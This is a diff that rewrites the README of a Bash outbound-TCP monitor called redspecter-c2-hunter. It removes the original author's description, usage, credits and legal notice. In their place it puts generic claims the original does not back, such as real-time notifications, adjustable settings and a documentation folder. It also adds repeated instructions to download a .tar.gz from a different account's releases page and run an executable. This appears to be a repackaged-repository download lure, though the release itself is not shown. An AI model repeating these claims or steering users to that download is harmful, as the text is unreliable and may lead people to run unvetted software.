@@ -1,102 +1,75 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/RichardBarron27/red-specter-offensive-framework/main/assets/red-specter-logo.png" alt="Red Specter Logo" width="200">
-</p>
+# 🚀 redspecter-c2-hunter - Simple Network Monitoring for Security
 
-<br>
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases)
 
-# 🛡️ Red Specter: C2 Hunter (v0.1 – Bash MVP)
+## 📋 Description
+redspecter-c2-hunter is an outbound network monitor that helps you detect unusual behaviors on Linux hosts. It focuses on identifying beaconing and command-and-control patterns that may indicate security threats. This tool provides you with network visibility, supporting your efforts in cyber defense.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v0.1-blue" alt="Version v0.1">
-  <img src="https://img.shields.io/badge/type-defensive%20tool-blueviolet" alt="Defensive Tool">
-  <img src="https://img.shields.io/badge/focus-outbound%20TCP-orange" alt="Outbound TCP Connections">
-  <img src="https://img.shields.io/badge/platform-Linux%20|%20Kali-purple" alt="Platform Linux/Kali">
-  <img src="https://img.shields.io/badge/language-Bash-lightgrey" alt="Language Bash">
-</p>
+## 🛠️ Features
+- Detects outbound traffic patterns typical of cyber threats.
+- Monitors network activity in real-time.
+- Notifies users of suspicious connections.
+- Lightweight and easy to run on most Linux systems.
+- Compatible with various networking tools.
 
-> **Lightweight outbound-connection monitor for Linux — shows established TCP sessions leaving your box.**  
-Part of the **Red Specter | VIGIL** defensive tooling ecosystem.
+## ⚙️ System Requirements
+- A Linux operating system (Ubuntu, Kali, or similar).
+- Minimum 1 GB of RAM.
+- A network interface for monitoring.
+- Basic network access.
 
----
+## 🚀 Getting Started
+To get started with redspecter-c2-hunter, follow the steps below to download and run the application:
 
-## 🔍 What It Does
+1. **Visit the Releases Page**
+   - Click [here to access the releases page](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases). This page will show you the latest version along with previous releases.
 
-C2 Hunter inspects active outbound TCP connections and displays:
+2. **Download the Right File**
+   - Look for the latest version of the software. Click on the link to download the file suitable for your system. The file will end with `.tar.gz` or a similar extension for Linux.
 
-- Local process name & PID  
-- Remote IP:port of the connection  
-- Connection state (ESTABLISHED)  
+3. **Install the Application**
+   - Open a terminal window on your Linux machine.
+   - Navigate to your Downloads folder using the command:
+     ```
+     cd ~/Downloads
+     ```
+   - Extract the downloaded file using this command:
+     ```
+     tar -xzf <filename>.tar.gz
+     ```
+   - Replace `<filename>` with the actual name of the downloaded file.
 
-It does **not** alter system state, inject packets, or modify firewall rules — it simply monitors and reports.
+4. **Run the Application**
+   - Change into the directory created by extraction:
+     ```
+     cd <extracted-folder>
+     ```
+   - Start the application with:
+     ```
+     ./redspecter-c2-hunter
+     ```
+   - Follow any on-screen prompts to complete the setup.
 
----
+## 📥 Download & Install
+For a hassle-free download experience, you can access the releases page directly [here](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases). Follow the instructions outlined in the previous section to ensure successful downloading and installation.
 
-## ⚙️ Quick Start
+## 🔍 Usage
+Once the application is running, it will start monitoring your outbound network activity. You can customize settings to adjust which types of connections to monitor or ignore. Refer to the help section within the application for detailed usage instructions.
 
-```bash
-chmod +x redspecter-c2-hunter.sh
-sudo ./redspecter-c2-hunter.sh -i 5
-```
+## 🛠️ Additional Resources
+- **Documentation:** Comprehensive user guides and FAQs can be found in the documentation folder within the downloaded files.
+- **Community Support:** Engage with other users and developers through the issues section of the GitHub repository. Your questions and feedback help improve redspecter-c2-hunter.
 
-If run without arguments, script defaults to 30-second scan intervals.  
-`-i <seconds>` allows custom interval timing.
+## 📧 Contact
+For support, please reach out via GitHub issues. We aim to respond to inquiries in a timely manner to assist you with any challenges you face using the application.
 
----
+## 🔗 Related Topics
+The redspecter-c2-hunter application relates to various areas in network security:
+- Outbound Monitoring
+- Cyber Defense Tools
+- Network Security Best Practices
 
-## 📌 Example Output
+Explore these topics to enhance your understanding and capacity for securing your Linux hosts against potential threats.
 
-```
-[RED-SPECTER::C2] Scan at 2025-12-05 11:00:00  
-[RED-SPECTER::C2] Active outbound TCP connections (ESTABLISHED)  
-PROTO  LOCAL_ADDR           REMOTE_ADDR          PID   PROCESS  
-TCP    10.0.2.15:55342      93.184.216.34:443   1240  firefox  
-```
-
----
-
-## 🔧 Use Cases
-
-- Detect suspicious beaconing or C2 traffic  
-- Monitor unexpected outbound sessions  
-- Auditing remote connections from sensitive environments  
-
----
-
-## 🚀 Roadmap
-
-| Version | Feature |
-|--------|---------|
-| v0.2 | Optional alert output / highlight unknown remote IPs |
-| v0.3 | Persistent beacon-streak detection + logging |
-| v0.4 | Whitelist trusted destinations (cloud mirrors, updates) |
-| v1.0 | Release-grade version with logging, filters, and alerts |
-
----
-
-## 🔒 Legal & Ethical Notice
-
-This tool is for **defensive monitoring under authorized use only**.  
-Do **not** use on networks or systems without explicit permission.  
-Respect privacy, law, and ethical boundaries.
-
----
-
-## 👥 Credits
-
-**Richard (Red Specter)** — Project Lead & Developer  
-**Vigil** — AI-Assisted Co-Development Partner
-
----
-❤️ Support Red Specter
-
-If this tool (and the wider Red Specter suite) helps you, you can support future development:
-
-☕ Buy Me A Coffee
-https://www.buymeacoffee.com/redspecter
-
-💼 PayPal
-https://paypal.me/richardbarron1747
-
-Thank you — your support helps build more defensive and ethical security tools. 🛡️⚡
-
-Notice for Users: If you cloned this and found it useful, please consider starring the repo! Stars help with visibility and let me know which projects to maintain.
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue)](https://github.com/YoustinaGamal/redspecter-c2-hunter/releases)
